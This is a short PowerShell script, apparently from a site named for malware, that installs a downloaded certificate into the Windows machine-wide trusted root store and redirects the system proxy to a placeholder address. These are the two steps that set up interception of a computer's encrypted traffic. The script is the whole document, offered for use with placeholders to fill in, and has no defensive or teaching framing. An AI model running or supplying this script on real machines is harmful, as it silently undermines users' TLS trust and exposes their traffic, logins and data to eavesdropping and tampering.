# ---------------------------------------------------------
#
# Skadevare.no
# A simple CA installer to trusted roots and proxy changer
#  
# ---------------------------------------------------------

# Download CA from b64 encoded blob
wget https://path.to.your-ca-cert/cert.b64 -o cert.b64
# Decode certificate
certutil -decode ".\cert.b64" ".\cert.cer"
# Import Ceritificate to Machine Root store
Import-Certificate -FilePath ".\cert.cer" -CertStoreLocation Cert:\LocalMachine\Root
# Set proxy settings on system
netsh winhttp set proxy x.x.x.x:8080


